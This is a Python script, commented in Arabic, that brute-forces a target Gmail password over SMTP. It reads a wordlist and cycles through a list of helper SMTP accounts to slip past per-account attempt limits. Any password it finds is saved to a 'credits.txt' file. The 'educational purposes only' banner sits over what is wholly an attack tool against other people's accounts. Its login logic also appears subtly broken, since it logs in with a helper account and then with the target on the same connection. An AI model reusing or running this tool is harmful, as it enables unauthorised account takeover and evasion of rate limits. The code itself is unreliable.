#!/usr/bin/env python3
import os
import sys
import time
import json
import smtplib
import random
from threading import Lock

# ---------- إعدادات ----------
WORDLIST_FILE = "hcowordlist.txt"      # ملف كلمات المرور التجريبية
ACCOUNTS_FILE = "smtp_accounts.json"   # ملف حسابات SMTP (للتوزيع)
TARGET_EMAIL = ""                      # سيُطلب من المستخدم
MAX_ATTEMPTS_PER_ACCOUNT = 10          # كم محاولة لكل حساب SMTP قبل تبديله
SLEEP_BETWEEN_ATTEMPTS = 2             # ثواني بين المحاولات (قليلة لأن الحسابات مختلفة)
# ----------------------------

# قفل للطباعة المتزامنة (في حالة تعدد الخيوط - اختياري)
print_lock = Lock()

def safe_print(msg, color="", end="\n"):
    with print_lock:
        print(f"{color}{msg}\033[0m", end=end)

def load_smtp_accounts():
    """تحميل حسابات SMTP من ملف JSON"""
    try:
        with open(ACCOUNTS_FILE, 'r') as f:
            accounts = json.load(f)
        # التحقق من صيغة الملف: يجب أن يكون قائمة من {email, app_password}
        if not isinstance(accounts, list):
            raise ValueError("accounts.json must contain a list")
        for acc in accounts:
            if "email" not in acc or "app_password" not in acc:
                raise ValueError("Each account must have 'email' and 'app_password'")
        return accounts
    except FileNotFoundError:
        safe_print(f"[!] File {ACCOUNTS_FILE} not found. Create it like:", "\033[1;33m")
        print('''
[
    {"email": "test1@gmail.com", "app_password": "xxxx xxxx xxxx xxxx"},
    {"email": "test2@gmail.com", "app_password": "yyyy yyyy yyyy yyyy"}
]
''')
        sys.exit(1)
    except Exception as e:
        safe_print(f"[!] Error loading accounts: {e}", "\033[1;31m")
        sys.exit(1)

def create_smtp_connection(email, app_password):
    """إنشاء اتصال SMTP بحساب معين"""
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(email, app_password)
        return server
    except Exception as e:
        safe_print(f"[-] Failed to connect with {email}: {e}", "\033[1;31m")
        return None

def try_login_with_account(target_email, password, smtp_account):
    """محاولة تسجيل الدخول إلى الهدف باستخدام حساب SMTP معين"""
    server = create_smtp_connection(smtp_account["email"], smtp_account["app_password"])
    if not server:
        return False, "connection_failed"
    try:
        server.login(target_email, password)
        server.quit()
        return True, "success"
    except smtplib.SMTPAuthenticationError:
        server.quit()
        return False, "bad_password"
    except Exception as e:
        server.quit()
        return False, f"error: {str(e)}"

def rotate_accounts(accounts, start_index=0):
    """مولد لا نهائي لتدوير الحسابات"""
    idx = start_index
    while True:
        yield accounts[idx % len(accounts)]
        idx += 1

def main():
    os.system("clear")
    # عرض بانر (اختصاراً)
    print("\033[1;32m=== Gmail Brute Force with Account Rotation ===\033[0m")
    print("\033[1;33m[!] For educational purposes only. Use on your own accounts.\033[0m\n")
    
    # تحميل القوائم
    try:
        with open(WORDLIST_FILE, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        safe_print(f"Wordlist file '{WORDLIST_FILE}' not found.", "\033[1;31m")
        sys.exit(1)
    
    smtp_accounts = load_smtp_accounts()
    if not smtp_accounts:
        safe_print("No SMTP accounts loaded. Exiting.", "\033[1;31m")
        sys.exit(1)
    
    target = input("\033[1;36mEnter target Gmail address: \033[0m").strip()
    if not target:
        safe_print("Target email cannot be empty.", "\033[1;31m")
        sys.exit(1)
    
    print(f"\n[+] Loaded {len(passwords)} passwords to try.")
    print(f"[+] Loaded {len(smtp_accounts)} SMTP accounts for rotation.")
    print(f"[+] Each account will attempt max {MAX_ATTEMPTS_PER_ACCOUNT} logins.\n")
    
    # إعداد تدوير الحسابات
    account_gen = rotate_accounts(smtp_accounts)
    current_account = next(account_gen)
    attempts_this_account = 0
    
    success = False
    idx = 0
    total = len(passwords)
    
    start_time = time.time()
    
    for idx, password in enumerate(passwords, 1):
        # إذا تجاوزنا الحد المسموح للحساب الحالي، ننتقل للحساب التالي
        if attempts_this_account >= MAX_ATTEMPTS_PER_ACCOUNT:
            safe_print(f"[*] Switching SMTP account (limit {MAX_ATTEMPTS_PER_ACCOUNT} reached).", "\033[1;34m")
            current_account = next(account_gen)
            attempts_this_account = 0
            time.sleep(1)  # راحة قصيرة بين الحسابات
        
        safe_print(f"[{idx}/{total}] Trying password: {password}", "\033[1;37m", end="")
        result, msg = try_login_with_account(target, password, current_account)
        
        if result:
            safe_print(f"\n\n✅ VALID PASSWORD FOUND: {password}", "\033[1;32m")
            success = True
            # حفظ النتيجة
            with open("credits.txt", "a") as f:
                f.write(f"\n[+] Target: {target}\n[+] Password: {password}\n[+] Found using account: {current_account['email']}\n")
                f.write("-" * 40 + "\n")
            break
        else:
            if msg == "bad_password":
                safe_print(" ❌ Bad password", "\033[1;31m", end="\n")
                attempts_this_account += 1
            elif msg == "connection_failed":
                safe_print(" ⚠️ Connection failed, skipping this account", "\033[1;33m")
                # هذا الحساب لا يعمل، نتحول إلى التالي فوراً
                current_account = next(account_gen)
                attempts_this_account = 0
            else:
                safe_print(f" ⚠️ {msg}", "\033[1;33m")
                attempts_this_account += 1
        
        # نوم قصير بين المحاولات
        time.sleep(SLEEP_BETWEEN_ATTEMPTS)
        
        # كل 50 محاولة نطبع تقريراً
        if idx % 50 == 0:
            elapsed = time.time() - start_time
            rate = idx / elapsed
            safe_print(f"\n[*] Progress: {idx}/{total} ({idx/total*100:.1f}%) | {rate:.1f} pwd/sec", "\033[1;36m")
    
    if not success:
        safe_print("\n[-] Brute force completed. No valid password found.", "\033[1;31m")
    else:
        safe_print("\n[+] Attack finished. Credentials saved to credits.txt", "\033[1;32m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        safe_print("\n[!] Interrupted by user. Exiting...", "\033[1;33m")
        sys.exit(0)
    except Exception as e:
        safe_print(f"\n[!] Unexpected error: {e}", "\033[1;31m")
        sys.exit(1)